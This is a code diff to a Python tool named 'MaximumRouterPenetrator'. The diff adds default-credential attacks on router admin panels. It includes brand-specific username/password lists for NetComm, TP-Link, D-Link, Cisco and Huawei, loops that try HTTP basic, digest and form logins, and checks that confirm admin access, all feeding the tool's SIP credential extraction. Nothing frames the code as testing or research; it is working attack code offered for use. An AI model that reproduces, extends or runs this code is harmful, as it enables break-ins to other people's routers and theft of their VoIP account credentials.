@@ -174,7 +174,11 @@ class MaximumRouterPenetrator:
             'brand_specific_testing': True, # Test brand-specific endpoints
             'aggressive_sip_extraction': True, # More aggressive SIP extraction
             'config_analysis': True,       # Analyze config files
-            'password_cracking': True      # Try to crack protected passwords
+            'password_cracking': True,     # Try to crack protected passwords
+            'advanced_credential_testing': True, # Advanced credential testing methods
+            'session_verification': True,  # Verify admin panel access
+            'authentication_bypass': True, # Test authentication bypass methods
+            'router_specific_credentials': True # Use router-specific credentials
         }
         
         # Cisco decryption
@@ -954,6 +958,29 @@ class MaximumRouterPenetrator:
             if verbose:
                 print(f"            ❌ Credential testing error: {str(e)}")
             auth_result = {'verified_access': False}
+        
+        # Step 4.5: Advanced credential testing (if basic failed)
+        if not auth_result.get('verified_access', False):
+            if verbose:
+                print(f"         🔑 LIVE DEBUG: Testing advanced credential methods...")
+            
+            try:
+                advanced_auth_result = self._advanced_credential_testing(target_ip, verbose)
+                if advanced_auth_result['success']:
+                    auth_result = {
+                        'verified_access': True,
+                        'credentials': advanced_auth_result['credentials'],
+                        'session': advanced_auth_result['session'],
+                        'method': advanced_auth_result['method'],
+                        'protocol': advanced_auth_result['protocol'],
+                        'port': advanced_auth_result['port']
+                    }
+                    result['techniques_attempted'].append('advanced_credentials')
+                    if verbose:
+                        print(f"         ✅ LIVE DEBUG: Advanced credential access successful!")
+            except Exception as e:
+                if verbose:
+                    print(f"            ❌ Advanced credential testing error: {str(e)}")
         
         if auth_result['verified_access']:
             result['verified_access'] = True
@@ -2015,16 +2042,20 @@ class MaximumRouterPenetrator:
                         continue
                     
                     if response.status_code == 200:
-                        if verbose:
-                            print(f"               ✅ LIVE DEBUG: Smart retry success!")
-                        return {
-                            'success': True,
-                            'session': session,
-                            'content': response.text,
-                            'method': f'smart_retry_{strategy["method"]}',
-                            'protocol': strategy['protocol'],
-                            'port': strategy['port']
-                        }
+                        # Verify admin panel access
+                        if self._verify_admin_panel_access(session, base_url, verbose):
+                            if verbose:
+                                print(f"               ✅ LIVE DEBUG: Smart retry success with admin verification!")
+                            return {
+                                'success': True,
+                                'credentials': (username, password),
+                                'session': session,
+                                'content': response.text,
+                                'method': f'smart_retry_{strategy["method"]}',
+                                'protocol': strategy['protocol'],
+                                'port': strategy['port'],
+                                'verified_admin_access': True
+                            }
                 
                 elif strategy['method'] == 'form_login':
                     if REQUESTS_AVAILABLE:
@@ -2050,16 +2081,20 @@ class MaximumRouterPenetrator:
                         'error' not in login_response.text.lower() and
                         'invalid' not in login_response.text.lower()):
                         
-                        if verbose:
-                            print(f"               ✅ LIVE DEBUG: Smart retry success!")
-                        return {
-                            'success': True,
-                            'session': session,
-                            'content': login_response.text,
-                            'method': f'smart_retry_{strategy["method"]}',
-                            'protocol': strategy['protocol'],
-                            'port': strategy['port']
-                        }
+                        # Verify admin panel access
+                        if self._verify_admin_panel_access(session, base_url, verbose):
+                            if verbose:
+                                print(f"               ✅ LIVE DEBUG: Smart retry success with admin verification!")
+                            return {
+                                'success': True,
+                                'credentials': (username, password),
+                                'session': session,
+                                'content': login_response.text,
+                                'method': f'smart_retry_{strategy["method"]}',
+                                'protocol': strategy['protocol'],
+                                'port': strategy['port'],
+                                'verified_admin_access': True
+                            }
                 
             except Exception as e:
                 if verbose and 'timed out' not in str(e).lower():
@@ -2790,6 +2825,244 @@ class MaximumRouterPenetrator:
                 print(f"            ❌ Authenticated extraction error: {str(e)}")
         
         return sip_extraction_result
+    
+    def _advanced_credential_testing(self, ip: str, verbose: bool) -> Dict[str, Any]:
+        """Advanced credential testing with multiple methods"""
+        if not self.advanced_features['advanced_credential_testing']:
+            return {'success': False}
+        
+        if verbose:
+            print(f"            🔑 LIVE DEBUG: Starting advanced credential testing...")
+        
+        # Get router-specific credentials
+        router_credentials = self._get_router_specific_credentials(ip, verbose)
+        
+        # Test with multiple authentication methods
+        auth_methods = [
+            {'name': 'http_basic_auth', 'method': self._test_http_basic_auth},
+            {'name': 'http_digest_auth', 'method': self._test_http_digest_auth},
+            {'name': 'form_based_login', 'method': self._test_form_based_login}
+        ]
+        
+        for auth_method in auth_methods:
+            try:
+                if verbose:
+                    print(f"            🔍 Testing {auth_method['name']}...")
+                
+                result = auth_method['method'](ip, router_credentials, verbose)
+                if result['success']:
+                    if verbose:
+                        print(f"            ✅ {auth_method['name']} successful!")
+                    return result
+                    
+            except Exception as e:
+                if verbose:
+                    print(f"            ❌ {auth_method['name']} error: {str(e)[:50]}")
+                continue
+        
+        return {'success': False}
+    
+    def _get_router_specific_credentials(self, ip: str, verbose: bool) -> List[Tuple[str, str]]:
+        """Get router-specific credentials based on detected brand"""
+        if not self.advanced_features['router_specific_credentials']:
+            return self.priority_credentials
+        
+        # Try to identify router brand first
+        router_info = self._identify_target_router(ip, verbose)
+        brand = router_info.get('brand', 'GENERIC_ROUTER').lower()
+        
+        # Router-specific credentials database
+        brand_credentials = {
+            'netcomm': [
+                ('admin', 'admin'), ('admin', 'support180'), ('support', 'support'),
+                ('user', 'user'), ('admin', 'password'), ('admin', '1234'),
+                ('admin', 'netcomm'), ('admin', 'router'), ('admin', ''),
+                ('root', 'admin'), ('root', 'root'), ('admin', 'netcomm123')
+            ],
+            'tplink': [
+                ('admin', 'admin'), ('admin', 'support180'), ('support', 'support'),
+                ('user', 'user'), ('admin', 'password'), ('admin', '1234'),
+                ('admin', 'tplink'), ('admin', 'router'), ('admin', ''),
+                ('root', 'admin'), ('root', 'root'), ('admin', 'tplink123')
+            ],
+            'dlink': [
+                ('admin', 'admin'), ('admin', 'support180'), ('support', 'support'),
+                ('user', 'user'), ('admin', 'password'), ('admin', '1234'),
+                ('admin', 'dlink'), ('admin', 'router'), ('admin', ''),
+                ('root', 'admin'), ('root', 'root'), ('admin', 'dlink123')
+            ],
+            'cisco': [
+                ('admin', 'admin'), ('admin', 'support180'), ('support', 'support'),
+                ('user', 'user'), ('admin', 'password'), ('admin', '1234'),
+                ('admin', 'cisco'), ('admin', 'router'), ('admin', ''),
+                ('root', 'admin'), ('root', 'root'), ('admin', 'cisco123')
+            ],
+            'huawei': [
+                ('admin', 'admin'), ('admin', 'support180'), ('support', 'support'),
+                ('user', 'user'), ('admin', 'password'), ('admin', '1234'),
+                ('admin', 'huawei'), ('admin', 'router'), ('admin', ''),
+                ('root', 'admin'), ('root', 'root'), ('admin', 'huawei123')
+            ]
+        }
+        
+        # Get brand-specific credentials or fallback to generic
+        credentials = brand_credentials.get(brand, self.priority_credentials)
+        
+        if verbose:
+            print(f"            🏷️ Using {len(credentials)} credentials for {brand.upper()} router")
+        
+        return credentials
+    
+    def _test_http_basic_auth(self, ip: str, credentials: List[Tuple[str, str]], verbose: bool) -> Dict[str, Any]:
+        """Test HTTP Basic Authentication"""
+        if not REQUESTS_AVAILABLE:
+            return {'success': False}
+        
+        for username, password in credentials:
+            try:
+                session = requests.Session()
+                response = session.get(f"http://{ip}/admin/", 
+                                     auth=HTTPBasicAuth(username, password),
+                                     timeout=self.performance_config['timeouts']['connection'],
+                                     verify=False, allow_redirects=False)
+                
+                if response.status_code == 200:
+                    if self._verify_admin_panel_access(session, f"http://{ip}", verbose):
+                        return {
+                            'success': True,
+                            'credentials': (username, password),
+                            'session': session,
+                            'method': 'http_basic_auth',
+                            'protocol': 'http',
+                            'port': 80
+                        }
+                        
+            except Exception:
+                continue
+        
+        return {'success': False}
+    
+    def _test_http_digest_auth(self, ip: str, credentials: List[Tuple[str, str]], verbose: bool) -> Dict[str, Any]:
+        """Test HTTP Digest Authentication"""
+        if not REQUESTS_AVAILABLE:
+            return {'success': False}
+        
+        for username, password in credentials:
+            try:
+                session = requests.Session()
+                response = session.get(f"http://{ip}/admin/", 
+                                     auth=HTTPDigestAuth(username, password),
+                                     timeout=self.performance_config['timeouts']['connection'],
+                                     verify=False, allow_redirects=False)
+                
+                if response.status_code == 200:
+                    if self._verify_admin_panel_access(session, f"http://{ip}", verbose):
+                        return {
+                            'success': True,
+                            'credentials': (username, password),
+                            'session': session,
+                            'method': 'http_digest_auth',
+                            'protocol': 'http',
+                            'port': 80
+                        }
+                        
+            except Exception:
+                continue
+        
+        return {'success': False}
+    
+    def _test_form_based_login(self, ip: str, credentials: List[Tuple[str, str]], verbose: bool) -> Dict[str, Any]:
+        """Test Form-based Login"""
+        if not REQUESTS_AVAILABLE:
+            return {'success': False}
+        
+        for username, password in credentials:
+            try:
+                session = requests.Session()
+                
+                # Get login page first
+                response = session.get(f"http://{ip}/", 
+                                     timeout=self.performance_config['timeouts']['connection'],
+                                     verify=False, allow_redirects=False)
+                
+                if response.status_code in [200, 401]:
+                    # Try multiple form fields
+                    form_fields = [
+                        {'username': username, 'password': password},
+                        {'user': username, 'pass': password},
+                        {'admin': username, 'adminpass': password},
+                        {'login': username, 'passwd': password},
+                        {'userid': username, 'passwd': password}
+                    ]
+                    
+                    for form_data in form_fields:
+                        login_response = session.post(f"http://{ip}/", 
+                                                    data=form_data,
+                                                    timeout=self.performance_config['timeouts']['connection'],
+                                                    verify=False, allow_redirects=False)
+                        
+                        if (login_response.status_code in [200, 302, 301] and
+                            'error' not in login_response.text.lower() and
+                            'invalid' not in login_response.text.lower()):
+                            
+                            if self._verify_admin_panel_access(session, f"http://{ip}", verbose):
+                                return {
+                                    'success': True,
+                                    'credentials': (username, password),
+                                    'session': session,
+                                    'method': 'form_based_login',
+                                    'protocol': 'http',
+                                    'port': 80
+                                }
+                                
+            except Exception:
+                continue
+        
+        return {'success': False}
+    
+    def _verify_admin_panel_access(self, session, base_url: str, verbose: bool) -> bool:
+        """Verify that we have actual admin panel access"""
+        if not self.advanced_features['session_verification']:
+            return True
+        
+        try:
+            # Test multiple admin panel indicators
+            admin_indicators = [
+                '/admin/', '/admin/index.asp', '/admin/main.asp', '/admin/status.asp',
+                '/cgi-bin/luci/admin/system/admin', '/userRpm/StatusRpm.htm',
+                '/Advanced_System_Content.asp', '/maintenance/backup.asp'
+            ]
+            
+            for endpoint in admin_indicators:
+                try:
+                    response = session.get(f"{base_url}{endpoint}", 
+                                         timeout=self.performance_config['timeouts']['connection'],
+                                         verify=False, allow_redirects=False)
+                    
+                    if response.status_code == 200:
+                        content = response.text.lower()
+                        # Check for admin panel indicators
+                        admin_keywords = [
+                            'admin', 'management', 'configuration', 'settings',
+                            'status', 'system', 'network', 'wireless', 'wan',
+                            'lan', 'dhcp', 'dns', 'firewall', 'routing'
+                        ]
+                        
+                        found_keywords = sum(1 for keyword in admin_keywords if keyword in content)
+                        if found_keywords >= 3:
+                            if verbose:
+                                print(f"               ✅ Admin panel verified: {endpoint} (keywords: {found_keywords})")
+                            return True
+                            
+                except Exception:
+                    continue
+            
+            return False
+            
+        except Exception as e:
+            if verbose:
+                print(f"               ❌ Admin verification error: {str(e)[:50]}")
+            return False
     
     def _perform_advanced_sip_extraction(self, ip: str, session, router_brand: str, verbose: bool) -> Dict[str, Any]:
         """Perform ADVANCED SIP extraction with multiple strategies"""
